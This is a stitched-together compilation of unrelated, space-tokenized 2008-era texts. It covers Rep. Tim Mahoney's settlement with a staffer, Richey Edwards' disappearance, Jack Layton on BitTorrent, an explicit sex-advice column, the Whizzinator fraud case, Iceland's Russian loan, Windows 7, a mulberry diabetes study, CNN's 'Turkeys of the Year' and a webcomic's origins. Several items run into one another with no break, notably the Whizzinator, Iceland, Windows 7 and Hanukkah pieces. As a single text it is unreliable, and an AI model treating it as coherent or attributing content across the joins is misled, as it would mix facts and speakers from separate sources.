Decoupling is the theory that emerging nations are increasingly weaning off US economic dependence and , thus , would weather an American economic slump better than in the past .
A retrenching US consumer " is totally irrelevant to China 's investments in clean water , improved agriculture and better infrastructure , " says Jim Rogers , the former hedge - fund manager turned global investor .
Peter Schiff , president of Euro Pacific Capital , offers a more severe assessment : " Everyone thinks the US is the engine , but it 's the caboose just being pulled along .
China and the others are healthy economies that foolishly loaned us their surplus capital that we squandered .
But that does n't reflect on the local economies .
They 're still intact .
The factories are still there , the work ethic is still there , and they 're not entirely dependent on the US for their own growth . "

Congressman's $ 121,000 Payoff to Alleged Mistress Tim Mahoney was elected to remove the ' ethical cloud ' of Rep. Mark Foley .
Oct. 13 , 2008  -- West Palm Beach Congressman Tim Mahoney ( D - FL ) , whose predecessor resigned in the wake of a sex scandal , agreed to a $ 121,000 payment to a former mistress who worked on his staff and was threatening to sue him , according to current and former members of his staff who have been briefed on the settlement , which involved Mahoney and his campaign committee .
Mahoney , who is married , also promised the woman , Patricia Allen , a $ 50,000 a year job for two years at the agency that handles his campaign advertising , the staffers said .
A Mahoney spokesperson would not answer questions about the alleged affair or the settlement , but said Allen resigned of her own accord and " has not received any special payment from campaign funds . "
Senior Democratic leaders in the House of Representatives , including Rep. Rahm Emanuel ( D - IL ) , the chair of the Democratic Caucus , have been working with Mahoney to keep the matter from hurting his re-election campaign , the Mahoney staffers said .
A spokesperson for Emanuel denies that account , but said Emanuel did confront Mahoney " upon hearing a rumor " about an affair in 2007 and " told him he was in public life and had a responsibility to act accordingly . "
The spokesperson added that it was a " private conversation " that had nothing to do with Mahoney 's re-election prospects .
Emanuel 's spokesperson said Emanual had not had any further contacts with Mahoney on the subject and did not know the woman involved worked on Mahoney 's Congressional staff until informed by ABC News .
Mahoney was elected two years ago following the abrupt resignation of his disgraced predecessor , Republican Mark Foley , whose lewd internet messages to teenage boys and Congressional pages created a national outrage .
The affair between Mahoney and Allen began , according to the current and former staffers , in 2006 when Mahoney was campaigning for Congress against Foley , promising " a world that is safer , more moral . "
Broken Campaign Promises ?
At the time , Mahoney 's campaign ads featured a picture of him with his wife , Terry , with the line , " Restoring America 's Values Begins at Home . "
The staffers say Mahoney first met Allen at a campaign stop and later arranged for her to work as a volunteer on the campaign .
Allen also appeared in a Mahoney campaign television commercial , criticizing his opponent .
Following his election in 2006 , Allen was hired , at taxpayers expense , to work on Mahoney 's Congressional staff in Florida , at a yearly salary of $ 36,000 .
After complaints about the affair circulated in Washington , Allen was moved to the campaign staff , the staffers say .
Friends of Allen told ABC News that Allen sought to break off the affair when she learned Mahoney was allegedly involved in other extra-marital relationships at the same time .
Her friends say she told them Mahoney threatened that ending the relationship could cost her the job .
" You work at my pleasure , " Congressman Mahoney told Allen on a January 20 , 2008 telephone call that was recorded and played for Mahoney staffers .
ABC News was provided a copy .
Click here to hear the tape .
" If you do the job that I think you should do , you get to keep your job .
Whenever I do n't feel like you 're doing your job , then you lose your job , " Mahoney can be heard telling Allen .
" And guess what ?
The only person that matters is guess who ?
Me . You understand that .
That is how life really is .
That is how it works , " Mahoney says on the call .
" You 're fired , " Mahoney tells her .
" Do you hear me ?
Do n't tell me whether it 's correct or not . "
Allen says , " Tell me why else I 'm fired . "
" There is no why else , " Mahoney responds .
Later , Allen says , " You 're firing me for other reasons .
You do n't , you 're not man enough to say it .
So why do n't you say it . "
The portion of the tape provided to ABC News cuts off when the two begin a profanity - laced argument .
The Terms of the Settlement
After Allen was fired , the 50 - year old single mother of two hired a lawyer , Gregory Coleman , and threatened to sue the Congressman for more than a million dollars .
Coleman , of the West Palm Beach firm Burman Critton Luttier & Coleman , also served as an attorney for former Congressman Foley .
Calls to Coleman , and the lawyer for Mahoney , Gary Issacs , were not returned .
In a February letter to Mahoney , Coleman alleged sexual harassment , intimidation , humiliation and charged that the Congressman 's behavior masked a " dark and depraved personality , " according to people who have seen the letter .
Following a day - long mediation session in March , Mahoney agreed to a settlement , staffers said .
Mahoney reportedly insisted that Allen destroy all audio and video recordings of a sexual nature , they said .
Allen is also prohibited from working for Mahoney 's opponent or any political candidate this election year , according to people familiar with the agreement .
In addition to the $ 61,000 payment , Mahoney agreed to pay $ 60,000 in legal fees to Allen 's lawyer , they said .
The Former Mistress ' Promise of a New Job ?
The agreement between the Congressman and Allen , reportedly promises her a job for two years at Fletcher Rowley Chao Riddle or another company , beginning January 2009 .
Fletcher Rowley , a Nashville - based political consulting firm that offers " crisis management and creative strategy , " lists Mahoney 's 2006 election victory as one of its " success stories , " according to its website .
The firm 's CEO , Bill Fletcher , strongly denied any knowledge of the settlement or any promise of employment to Allen .
" I know nothing of the like , " he told ABC News .
" There is no such agreement .
There is no arrangement , " Fletcher said .
According to Fletcher , all funds paid to his company by the Mahoney for Congress campaign were properly accounted for .
" I 've made no payments to any third party , " he said .
According to people briefed on the settlement Allen was promised at least $ 50,000 a year or other employment if the Fletcher Rowley job fell through .
Friends of Allen say she was required to sign a back - dated letter of resignation to the campaign chairman , Charles Halloran , describing her departure as " amicable " and " nothing to do with you , the Congressman , the campaign , or any conduct by anyone associated with your congressional office of campaign . "
A Mahoney campaign spokesman said , " Patricia Allen resigned of her own accord , in good standing . "
The spokesman said there " was no sexual harassment suit filed against Congressman Mahoney . "
Allen , reached at her home in Hobe Sound , said she was " unable " to comment publicly .
Her friends say her settlement agreement with Mahoney prohibits her from making " negative comments " about him .

The disappearance in 1995 of the Welsh rock musician Richey Edwards , then aged 27 , became a major British media event and , in the years that followed , supposed sightings of ( or messages from ) Edwards , akin to those of Elvis Presley in the US , lent a bizarre aspect to his supposed death .
Edwards , whose parents have been granted a court order declaring him to be presumed dead , was himself a student of rock music history and popular culture , and would surely have been amused to find himself the object of so much speculation and intrigue .
Amused but not surprised : as a member of the Welsh rock group the Manic Street Preachers , Edwards had often courted controversy and commanded a loyal following .
Edwards ' talent was not that of a musician - he could barely play the guitar - but as a lightning rod of sorts for adolescent angst .
A handsome , gaunt man , Edwards embodied similar qualities to the 18th - century poet Thomas Chatterton or , more recently , the rock singer Pete Doherty .
The irony of his disappearance is that it led to the Manic Street Preachers becoming one of Europe 's most popular bands in the mid-1990s , his absence allowing the three remaining musicians to create more mainstream rock - pop .
Richard James Edwards grew up in Blackwood , south Wales , where he attended Oakdale comprehensive .
Between 1986 and 1989 , he attended the University of Wales , Swansea , graduating with a degree in political history .
While there he befriended Nicky Wire .
Wire was playing guitar in a punk band , initially called Betty Blue before changing to the Manic Street Preachers , and Edwards became the band 's roadie and driver .
When the band 's bassist quit , Wire shifted to bass and Edwards , who had begun collaborating with Wire on song lyrics and design , joined as rhythm guitarist .
That he possessed no musical ability was not a problem - pale and thin , Edwards looked like a rock music archetype .
While in the band he preferred to be referred to as Richey James .
In August 1989 the band independently issued their debut single Suicide Alley .
The following year they issued the EP New Art Riot on the Damaged Goods label .
This attracted interest from the UK music press due to their attacks on fellow rock musicians .
A management deal followed and the band released the January 1991 single Motown Junk via Heavenly Records .
This attracted press attention with such combative lyrics as , " I laughed when Lennon got shot . "
The Manic Street Preachers ' confrontational attitude looked back to British punk rock , and their concerts also aped the chaos of that era .
This proved a perfect mix for the music press , which began championing the band .
When the NME journalist Steve Lamacq questioned the band 's commitment , Edwards grabbed a razor - blade and carved " 4 REAL " into his own forearm .
The wound received 17 stitches and the glossy photographs taken of the gory graffiti helped confirm to teenagers that here was a band who " meant it " .
In the wake of the ensuing publicity Sony Records signed the band and , in 1992 , they issued Generation Terrorists , an ambitious double - album on which each of the 18 songs was accompanied by a literary quotation .
While reviews were mixed - the band 's limited musical ability and reliance on aggressive posturing alienated many - Generation Terrorists sold over 250,000 copies and established the Manic Street Preachers as Britain 's new indie rock hope .
In September 1992 the band 's recording of Theme from MASH ( Suicide is Painless ) reached No 7 in the UK singles chart and suggested they might have wide appeal .
Edwards , by now the focus of intense fan devotion , enjoyed fame but began showing signs of emotional instability .
Self - mutilation ( often burning himself with cigarettes ) , anorexia nervosa ( for which he wrote the song 4st 7lb ) and alcoholism combined to make him increasingly unreliable .
In 1994 he was admitted to the Priory hospital for treatment .
The band played on as a three - piece - Edwards ' guitar amplifier had often been turned down low , so his absence did not affect their sound .
While the band 's 1993 album Gold Against the Soul had not been strongly received , their third album , The Holy Bible ( 1994 ) - with a Jenny Saville painting on the cover - re-established their critical worth .
Most of The Holy Bible 's lyrics were written by Edwards and , under the influence of Sylvia Plath , expressed the depths of depression .
Edwards was booked to travel to the US on February 1 1995 with the band 's singer James Dean Bradfield for promotional duties , but never took the flight .
Little is known about his movements in the following days , although it appears he left London for Wales .
On February 14 that year his abandoned Vauxhall Cavalier received a parking ticket at the Severn service station , and it is widely believed that he jumped to his death from the Severn Bridge .
Edwards is survived by his parents , Graham and Sherry , and sister Rachel .

That the gist of the late - breaking news from MSNBC , saying that Dems have reportedly decided to let Lieberman keep his committee chair , provided he gives up his subcommittee ( not totally clear why that matters ) .
The turning point in the saga was supposedly two things .
First , that Obama wanted Lieberman to stay in the caucus .
And second , that Lieberman threatened Harry Reid that he ’d walk and join the Republicans .
Yes , Lieberman threatened that he ’d join the minority instead of the majority , making his remaining years in the Senate emasculating , powerless and unimportant .
Gee , no briar patch available ?
Not to mention , since when was n’t the potential for Lieberman to walk and join the Republicans a possible expected outcome ?
That ’s not news , so it should n’t have influenced the debate .

Today I checked CPANTS again and there are 10,235 such distributions .
I 'd rather see this number shrinking than growing and it is very simple to do that .

Three days before the Canadian elections , the party leader of the New Democrats has spoken out in favor of BitTorrent sites , calling them " fundamental to democracy . "
At the same time , isoHunt , the largest Canadian BitTorrent site advises its users not to vote for the Conservatives , considering their stance on copyright issues .
Jack Layton , leader of the Canadian New Democrats is a proponent of net - neutrality , and he believes that social networking sites , YouTube and torrent sites are great services that should be available to everyone .
In a direct message to our friends at p2pnet Layton stated : “ Torrent sites [… ] are actually very fundamental to making a democracy work , and to helping human intelligence to be shared and exchanged .
It ’s about as fundamentally democratic as you can get . ”
In the video message Layton is very clear .
Throttling people ’s connections is not an option .
The Internet should be open and equal to everyone .
“ What we want to see is the Internet used as a public tool — a public tool for exchanging ideas and I particularly want to say that if we do n’t fight to preserve it , we could lose it .
We do n’t want to see hidden fees and gouging and service slow - downs all in the interests of promoting the objectives of certain large corporations , ” Layton says in his message to P2Pnet .
With his statement , he joins his fellow party member Charles Angus , who has spoken out against against ‘ anti- piracy bills ’ and in favor of Net - neutrality many times before .
In an interview last June , for example , he said that the proposed three - strikes law is idiotic , and completely useless .
“ It ’s idiotic because as we see with the DMCA those that get accused of infringements lack the legal power that the corporations that are threatening them have , ” Angus said .
“ So it ’s always going to be a completely one - sided argument and if ISP ’s are legally bound to cut you off after three claims of infringement , I think there are certainly problems . ”
Based on their views on net - neutrality and copyright bills , the New Democrats seem to be the best party to vote for .
Much better than the Conservatives at least , who are supporting ACTA and bill C - 61 .
Unfortunately , many Canadians are planning to vote for the Conservative , as they are awfully close to a majority .
This triggered is oHunt ’s founder Gary Fung , who ’s from Canada as well , to encourage his Canadian users not to vote for them .
On the frontpage of isoHunt Gary writes : “ I know about 3.7 million Canadians visited is oHunt last month , which is more than 10 % of Canada ’s population .
So I ask all who read this to tell your Canadian friends to not be a slacker and vote on Oct. 14 .
I do n’t care which party you vote , just vote any party but the Conservatives . ”
In addition to this statement , all Canadian isoHunt visitors will now see the following message on top of the page , which leads them to Gary ’s statement .
isoHunt ’s message to Canadian voters
The New Democrats seem to be a good alternative to the Conservative party .
However , towards the end of the video message Layton scared us a little by saying : “ The Internet belongs to Canadians , ” but we ’re pretty sure he is trying to say that all Canadians should have equal access to the web .

Dear Busy Beaver & Pugs ,
I recently started talking and flirting with a woman at work and am very attracted to her .
I can tell she likes me too , but I 've never actually been with a woman before , only guys .
I 've been trying to learn about having sex with girls by reading books and watching movies , but I 'm not sure what to expect .
Is it really necessary to go down on a woman ?
Would it be wrong for me to want her to do me and not give back ?
I guess what I really want to know is what to expect once I 'm down there .
A male friend told me it tasted like a nine - volt battery — like when you touch your tongue to those prong thingies on top .
Is this true ?
Thanks ,
Lesbian Newbie
Dear Newbie ,
I am so tempted to pull the battery out of my smoke detector and taste it right now so that I can give you an answer on that last question .
But unlike your guy friend , I do n’t make a habit of licking batteries , so the taste of them will have to remain a mystery — unlike the taste of a woman ’s nether regions .
To answer your first concern about never having been with a woman , well , everyone has to start somewhere .
Has the other gal been with women ?
If so , great .
She can teach you the basics and what she likes .
Just follow her lead and / or try doing things to her body that you ’d like to have done to your body .
If the object of your affection has not been with other women , you are on a level playing field that will be both awkward and exciting at the same time .
Practice , practice , practice .
And communicate .
You ’ll hear me say that a lot .
Do you have to go down on her ?
Hell , yes !
Absolutely .
Positively .
Unequivocally .
Maybe not the first time , but eventually .
That comes standard .
I would tell a straight man the same thing .
Learn to love it , Newbie .
Do n’t focus on the taste .
Learn to love the taste .
Some girls taste like nothing , sometimes there ’s a little “ tang , ” and maybe some girls taste like 9V batteries , but I would n’t know .
( Help me out readers , what does your gf taste like ? )
If they taste really horrible , they need a lesson in hygiene and you are free to gag and tell them to take a shower before you will proceed .
Dive in !
Beave
Dear Newbie ,
Ouch !
Would n’t it hurt if you rubbed your tongue on a 9 - volt battery ?
I ’m not trying it either .
And as for choking and gagging like you ’ve got a furball stuck in your throat if your gal tastes bad , I would n’t do that either .
That Beave is so funny , is n’t she ?
OK , here ’s how I felt the first time I went down on my lady friend .
My partner and I were newbies together so we talked a lot during our first time together .
Btw , she had nice smooth thighs which was a nice switch from those hair - infested gams men have .
Spend a little time kissing your girl ’s thighs ; you and she both will like that I promise .
And though I was nervous as hell , I figured her lady jizz could n’t taste any worse than the man jizz I was used to .
And guess what ?
She tasted way better !
I do n’t know if you ’ve had experience with blowing men but if you have , keep thinking that going down on a woman is a much better experience .
The taste and the consistency of the jizz is much better in a woman .
Yes , absolutely , you must go down on her !
You want her to do you , do n’t you ?
Well it ’s a “ scratch my back , I ’ll scratch yours ” kind of deal .
But the fun thing about “ scratching ” another woman ‘s vagina is while it feels fantastic to her , it will feel pretty good to you too .
So get busy scratching !

The two men responsible for the Whizzinator - a prosthetic todger designed to beat those pesky drugs tests - have each pleaded guilty to two counts of conspiracy to defraud in a federal court in Pittsburgh .
Robert Catalano and George Wills punted their fake schlong through California - based internet outfit Puck Technology .
The website explained : " The Whizzinator is the ultimate solution for a drug testing device .
It is very comfortable to wear for long periods of time while the body temperature is maintained with organic heat pads .
" The prosthetic penis is very realistic and concealing is simple , while our quality production and materials assures you that the The Whizzinator will let it flow again and again , anytime , anywhere you need it ! "
Puck Technology also offered the " Number 1 Urinating Device " and , of course , the splendidly - named " Yellow River " - described as " The # 1 Solution To Your Synthetic Urine Needs " .
It 's apparent that prosecuting US Attorney Mary Beth Buchanan and her office did n't have to work to hard to make their case that the aim of both devices and associated synthipiss " was to help people pass drug tests " .
Puck Technology 's glowing customer testimonials featured this enthusiastic contribution from one Bryan : " I am 33 and used The Whizzinator to pass a screening test given by my job that I have been working at for 3 years and because of restructure , I had to test .
Thanks to Puck Technology , I passed and will continue to pass .
Thanks a bunch !
I WILL refer you to friends ! "
Catalano and Wills will be sentenced in February .
They face a maximum penalty of eight years in prison , a fine of $ 500,000 , or both . ®
Not only does politics make for strange bedfellows , but so does desperation .
Iceland is looking to borrow over $ 5 billion from Russia to shore up its banks .
Um , Iceland is a member of NATO , or at least is now .
As reader Jørgen commented ,
Russia backstopping Iceland ?
What is the pay - back ?
Keflavik ?
I guess this resembles blackmail of EU :
If you do n’t rescue us , Putin will .
Reading the Reuters story on this surprising turn of events , it appears that Iceland is not willing to seek assistance from the IMF , since in the Asian crisis , it imposed reforms that were seen as draconian ( and many believe contained counterproductive elements ) .
Update 7:15 PM .
I thought Jørgen was kidding .
Even if he was , he was spot on .
The Spectator confirms the idea ( hat tip reader RB ) :
But what price will the Russians demand for their bailout ?
A highly - placed source in Reykjavik tells Coffee House that Iceland might look kindly on requests from Russia ’s military to use America ’s former military base in Iceland .
America closed its Naval Air Station at Keflavik Airport two years ago , handing back the Nato facility to the Icelandic government .
From Reuters :
Iceland took over its second largest bank , propped up a battered currency and sought on Tuesday a 4 billion euro ( $ 5.44 billion ) loan from Russia to help tackle a crisis threatening to overwhelm the island nation .
Russian Finance Minister Alexei Kudrin said Moscow viewed positively the request from Iceland , whose premier said it had faced a risk of “ national bankruptcy . ”
“ The result will be announced after negotiations , ” Kudrin said .
Prime Minister Geir Haarde said Icelandic officials would travel to Moscow on Tuesday or Wednesday to discuss terms for the loan to bolster the country ’s foreign reserves .
“ With this , like everything else , nothing is certain until it ’s certain , ” Haarde told a news conference .
He said Iceland would not default on its sovereign debt …..
Yves here .
If you believe that , I have a bridge I ’d like to sell you .
Microsoft on Tuesday for the first time publicly demonstrated Windows 7 , the next major release of its OS for PCs that Microsoft insists will reflect lessons learned from the widely panned Windows Vista .
Microsoft also laid out a road map for the release of Windows 7 and handed out a pre-beta version to developers at the Professional Developers Conference ( PDC ) , where it also demonstrated new features in a keynote address Tuesday .
The first public beta of the OS will be available early next year , and subsequent test releases and release candidates will follow based on that feedback , said Steven Sinofsky , senior vice president of Windows and Windows Live at Microsoft .
Windows 7 is still targeted for release three years after Vista , he added .
This would put its business release in late 2009 and general availability at the end of January 2010 if the OS remains on schedule .
In his keynote Tuesday , Sinofsky said Microsoft is learning its lessons from Vista , which was widely criticized by users and the press , and spoofed famously in humorous television advertisements by competitor Apple .
Sinofsky acknowledged that some of the criticism was deserved , particularly around Microsoft 's lack of preparing its hardware , software and peripheral partners for Vista 's release , even though it was more than five years in the making .
Early Vista users experienced incompatibility with applications and found that devices and peripherals would not work with the OS because drivers were n't available upon the release of the OS .
Microsoft wo n't repeat this mistake with Vista , Sinofsky said , and because the OS kernel -- or its underlying code base -- is the same as the one in Vista and Windows Server 2008 , all of the devices and applications that work with those OSes should also run on Windows 7 .
" All of this device and compatibility work will pay off in Windows 7 , " he said .
Microsoft also will tweak the User Account Control feature ( UAC ) , which was new in Vista , so it will be less of an inconvenience and work more efficiently for users , Sinofsky said .
UAC prevents users without administrative privileges from making unauthorized changes to a PC .
But because of how it was set up in Vista , it can prevent even authorized users on the network from being able to access applications and features they should normally have access to .
UAC did this through pop-up windows , which also were spoofed by Apple in television ads because Vista users reported they appeared so frequently , even when users were performing authorized tasks .
Sinofsky acknowledged that Microsoft " went a little too far with UAC , " but as a result the Windows client OS is now more secure .
In Windows 7 , Microsoft will focus on the security aspects of UAC but will ensure it is not an invasive feature for users , he said .
During Tuesday 's keynote , Microsoft showed off some new features in Windows 7 , including a streamlined view of all the files and folders contained not only on a user 's PC , but also any other PCs on networks that the users are allowed access to .
This feature is called Libraries , and it will improve desktop search in Windows 7 by allowing users to search more comprehensively across PC folders than ever before , according to Microsoft .
Microsoft also changed its Gadgets feature , another new Vista feature .
Gadgets are mini-applications that give users quick access to information , such as stock prices or weather , with icons that users in Windows 7 will be able to move around the desktop .
In Vista , gadget icons were confined to a task bar .
Perhaps the sexiest new Windows 7 feature demonstrated Tuesday was its touchscreen interface , which lets people use their fingertips and small hand gestures to control applications on their PCs .
Microsoft demonstrated how touchscreen controls can replace the mouse for things like opening the taskbar and choosing a Windows Explorer window .
If a user opens a folder with photos in it in Windows Folder , they can scroll through those photos using their fingers , and drag a photo into a Windows Paint application window and draw directly on the photo .
President Bush and his wife , Laura Bush , will be hosting a Hanukkah reception for Jewish leaders at the White House next month .
It 's a nice gestu re .
There 's just one kvetch :
The invitations for the Hanukkah party show a Clydesdale horse pulling a big Christmas tree up the driveway at 1600 Pennsylvania Ave .
And there 's a Christmas wreath tacked to the White House in the background .
Sally McDonough , a spokeswoman for Laura Bush , blamed the goof on a " staff mistake , " according to the New York Post .
" Mrs. Bush is apologetic , " McDonough said .
" It is just something that fell through the cracks . "
Although the mistake has invited lots of teasing in the blogosphere , not everyone is offended .
The Orthodox Union 's Institute for Public Affairs defended the president on jta.org :
Not only is George W. Bush the first to place a Chanukah Party on The White House calendar , but when the fact of this event is considered in the context of Jewish history -- a history of centuries of persecution and exclusion -- a sensible person 's only reaction can be one of gratitude for the freedom Jews enjoy in the United States of America and respect and appreciation for this nation 's president .

Writing in the Journal of Agricultural and Food Chemistry ​ , the researchers describe the production of a food - grade mulberry powder with an optimized content of 1 - deoxynojirimycin ( DNJ ) content , a compound shown to inhibit the action of the glucosidase enzyme that controls the digestion of carbohydrates .
" This study suggests that the newly developed DNJ - enriched powder can be used as a dietary supplement for preventing diabetes mellitus , " ​ wrote lead author Toshiyuki Kimura from Tohoku University , in collaboration with researchers from National Agricultural Research Center for Tohoku Region , Minato Pharmaceutical Company , and Nippon Medical School .
An estimated 19 million people are affected by diabetes in the EU 25 , equal to four per cent of the total population .
This figure is projected to increase to 26 million by 2030 .
In the US , there are over 20 million people with diabetes , equal to seven per cent of the population .
The total costs are thought to be as much as $ 132bn , with $ 92bn being direct costs from medication , according to 2002 American Diabetes Association figures .
While DNJ has been shown to inhibit glucosidase , the concentration of the compound in commercial mulberry products is extremely low , state the researchers , with levels as low as about 0.1 per cent .
Kimura and co-workers set about producing a food - grade mulberry powder with high DNJ content , and then determining the optimal dose of the DNJ - enriched powder needed to suppress blood glucose levels after a meal through clinical trials .
Using hydrophilic interaction chromatography with evaporative light scattering detection the researchers obtained a mulberry powder containing 1.5 per cent DNJ .
" Young mulberry leaves taken from the top part of the branches in summer contained the highest amount of DNJ , " ​ wrote the authors .
To test the efficacy of the extract , the researchers recruited health volunteers and assigned them to receive 0 , 0.4 , 0.8 , and 1.2 g of DNJ - enriched powder , giving a corresponding dose of DNJ of 0 , 6 , 12 , and 18 mg .
This was followed by 50 g of sucrose .
Blood glucose and insulin levels were measured before sucrose consumption , and again 30 - 180 minutes later .
" A human study indicated that the single oral administration of 0.8 and 1.2 g of DNJ - enriched powder significantly suppressed the elevation of postprandial blood glucose and secretion of insulin , revealing the physiological impact of mulberry DNJ ( effective dose and efficacy in humans ) , " ​ concluded the researchers .
Further research is needed to examine the efficacy of the extract in other population groups , including overweight and obese subjects who are more susceptible to type - 2 diabetes .
The research adds to a growing body of evidence of the potential health benefits of berries that has filtered through to the consumers and has seen demand increase .
Indeed , sales of blueberries , for example , are reported to have rocketed by 130 per cent , raspberry sales are said to have grown by 62 per cent in the last two years , a strawberry sales in the UK are reported to have increased by 34 per cent during the last two years .

( CNN ) -- November 27 may be Turkey Day in America , but in the world of politics , every day is turkey day .
Former New York Gov. Eliot Spitzer earned his Turkey of the Year recognition for his involvement in a prostitution ring .
Turkeys are foolish creatures -- overstuffed , noisy and self - important .
A lot like the politicians on our list of Turkeys of the Year .
Turkey No. 10 : Rudy Giuliani puts all his eggs in one basket -- Florida .
" We are going to win in Florida , and then we will be talking about exactly who made the right decisions , " Giuliani says on CNN's " The Situation Room " a week before the primary .
Giuliani ends up third in Florida , with 15 percent of the vote .
The former New York City mayor was relying on the many former New Yorkers who have moved or retired to Florida .
There 's just one problem : most of them are Democrats , and Democrats can't vote in Florida 's Republican primaries .
Watch what made these turkeys memorable »
Turkey No. 9 : In 2006 , Tim Mahoney defeated Florida Rep. Mark Foley after it was revealed that Foley had sent sexually suggestive messages to congressional pages .
Mahoney 's campaign demanded an investigation .
This year , Rep. Mahoney again called for an investigation -- this time by the House ethics committee into his own behavior , after it was reported that he had paid off a staffer to avoid a sexual harassment lawsuit .
Mahoney later admitted to " multiple affairs , " including one with a local government official who had business with his office .
Mahoney lost his bid for re-election .
But not everything was lost .
" The irony is not lost on any of us , ' " a senior Democratic operative observed .
Turkey No. 8 : In June , Barack Obama addresses a meeting of Democratic governors in Chicago .
His rostrum bears ... what is this ?
A presidential seal ?
Not quite .
The eagle looks familiar , but instead of a shield , there 's the letter " O. ' '
The seal says , " Obama for America . ''
And that Latin phrase , " Vero Possumus ' ' ?
It means , " Yes , we can . "
A little presumptuous , perhaps , four months before the election ?
" That was a one - time thing for a one - time event , '' Obama 's campaign spokesman tells CNN .

In Depth : Transition to Power
Turkey No. 7 : Sen. Elizabeth
Dole runs a TV ad accusing her Democratic opponent of taking " godless money . ''
The ad refers to " a secret fundraiser in Kay Hagan 's honor ' ' co-hosted by an adviser to an atheist advocacy group .
The ad shows a picture of Hagan while a woman 's voice declares , " There is no God . ''
The voice is not Hagan's .
" I am a Sunday school teacher , '' Hagan tells reporters in a conference call .
" I am an elder at First Presbyterian Church in Greensboro .
My family has been going to this church for over 100 years . ''
Hagan files a lawsuit against Dole for defamation and libel .
She subsequently defeats Dole in the North Carolina Senate race .
And drops the lawsuit .
Turkey No. 6 : Alaska Senator Ted Stevens , the king of pork , turns into a turkey .
The longest serving Republican senator in history is convicted on seven felony charges of corruption for failing to disclose hundreds of thousands of dollars worth of gifts and free services .
John McCain , Alaska Gov. Sarah Palin and Senate Republican leader Mitch McConnell call on Stevens to step down .
Stevens ' response : " I am innocent . ''
He tells Alaska voters that he " has not been convicted of anything . ''
In a close race , Stevens narrowly loses his bid for re-election and becomes a symbol of corruption and arrogance in Washington .
Turkey No. 5 : Not politicians this time , but arrogant auto executives who come to Washington looking for a bailout .
In their private jets .
" I 'm going to ask the three executives here to raise their hands if they flew here commercial , " said Rep. Brad Sherman , D - California , adding " let the record show that no hand went up . "
The AIG insurance company does get an $ 85 billion federal bailout .
Whereupon 70 of their executives reward themselves with a weeklong spa retreat .
The cost ?
A cool $ 440,000 .
Turkey No. 4 : After videos surface of the Rev. Jeremiah Wright 's controversial sermons , Barack Obama delivers a major speech distancing himself from his pastor 's sensational comments .
Then Wright appears at the National Press Club to give his side of the story .
He claims Obama " did n't denounce him ' ' but " did what politicians do . ''
" I said to Barack Obama last year , ' If you get elected , November 5th , I 'm coming after you because you 'll be representing a government whose policies grind under people , " Wright said .
Obama does get elected , and Wright keeps his word .
" As long as you are presiding over policies that grind God 's people into the earth , I 'm coming after you , " Wright threatens in a radio interview after the election .
Turkey No. 3 : The financial crisis hits in mid-September , and John McCain declares , " The fundamentals of our economy are strong . "
The Republican nominee makes a startling announcement a few days before the first debate .
McCain says , " Tomorrow morning I 'll suspend my campaign and return to Washington . "
Why ?
To rescue a federal bailout package for the financial industry .
McCain goes to Washington and what happens ?
His own party kills the rescue package .
Men can really be turkeys .
Want proof ?
Turkey No. 2 : " I have responded consistently to these tabloid allegations by saying I do n't respond to these lies . "
That was John Edwards in July .
But they were not all lies .
The next month , the former Democratic presidential candidate responds with a public confession of an extramarital affair .
He explains his behavior as " a self - focus , an egotism , a narcissism , that leads you to believe that you can do whatever you want .
You 're invincible .
And there will be no consequences . "
Want another example of men being turkeys ?
Turkey No. 1 : New York governor -- make that , former governor -- Eliot Spitzer , who had to resign because of his involvement with a high - priced call - girl service .
" Over the course of my public life , I have insisted , I believe correctly , that people regardless of their position or power take responsibility for their conduct .
I can and will ask no less of myself .
For this reason , I am resigning from the office of governor , " Spitzer said .
" To every New Yorker and to all those who believed in what I tried to stand for , I sincerely apologize , '' said the hard - charging , suddenly humbled ex-governor .
And with that , the turkey is served .
More turkey ?
We invite you to add turkeys of your own .

I honestly would n’t possibly remember how Geek Hero started .
In March 2008 , at some point , I must ’ve felt like shifting from reading comics to making them .
My favourite was XKCD , and so it played a huge inspiration role .
The main Geek Hero character , Randie , is named after the author of XKCD .
Geek
Hero wanted to be a comic that talked about a geek , and how geeks have a big heart .
It wanted to be a way to tell the world that there ’s a little hero inside every geek .
Since I had never drawn anything before , Geek Hero started really simple .
And since XKCD was a big muse , Geek Hero started as stick figures !
There are 10 unpublished strips , the first 10 , which are basically black and white stick figures , something between XKCD and Cyanide & Happiness .
This is probably the first drawing of Randie hacking :
It was really hard , at first , not having any previous experience drawing comics , to find the right technique .
And gee , did I google the hell out of the Internet !
I experimented a lot of possible ways to draw it , but very , very soon , something clicked .
I ’m a programmer , I ’ve been coding since I was 9 .
This means that my whole mindset is kind of shaped around programming concepts .
I would say that the most influential ones are a very strict logic , the urge to optimise everything , and the impossibility to keep myself from automating repetitive tasks .
See , someone whose mindset is completely revolving around programming paradigms , finds pretty normal to answer “ Yes ” to questions like “ Would you like an apple or an orange ? ” .
And he would use punctuation marks just like I did in the previous sentence .
And he can’t , absolutely CANNOT keep his fingers away from CTRL+C and CTRL+V .
After experimenting with the drawing a little be , my process was as follows .
First I would draw on an A4 paper sheet , then I would scan it , then I would try to automatically trace the bitmap to vectors .
For the first strips it kinda worked for me .
But very soon I could n’t do this anymore .
The desks were always the same , why would I want to draw them all the time ?
Also the characters were always the same .
I needed to refactor it , optimise it .
In the meantime I got better with Inkscape , and I had more skills to work with , so I started building a sort of clip - art collection , that I could use to build each comic strip .
And that ’s how the first coloured Randie came to life .
And there it was .
Coloured , vectorized , barely shaded , and could breath only through his mouth !
The arms and legs were sticks , and his single curved hair looked thicker than them !
At this point , the storyline started already to evolve into a plot centred around Randie ’s ego .
In the beginning I wanted him to be cute and nice , but he was too geeky for that .
He probably appreciates a good compiler more than a good friend , and is offended to death by ridiculous programming languages , such as Visual Basic !
So Ross was born , out of pure odds .
He already appeared before , as the CEO ’s assistant , but I liked his afro hair so much , that I wanted him to become one of the leading characters of Geek Hero .
So now he ’s the ex Visual Basic programmer trying to learn C and steal Randie ’s job , because he thinks he ’s finally be cool , if he ’s a good hacker .
This style worked for lots of strips , but then another paradigm of the programmer ’s mindset kicked in : if something works , it ’s time to break it and improve it !
I had been reading a lot of other articles about making comics , and stuff about lighting and shading .
Geek Hero was ready to evolve .
I got hold of my clip - art collection and started working on it .
I wanted to have something a bit less rudimentary , with more of a free - hand touch ( at least something that looked like it ) and better shading .
I got this :
And again , these worked pretty well for a while .
But then , something kicks in again , and I need to experiment some more .
What I was unhappy with , was the fact that these characters did n’t really have many postures .
I would change their facial expression usually by the means of just adjusting the mouth , then I would move the arms and legs , and zoom them in or out , and have them interact with each other .
But have you ever seen them from the back ?
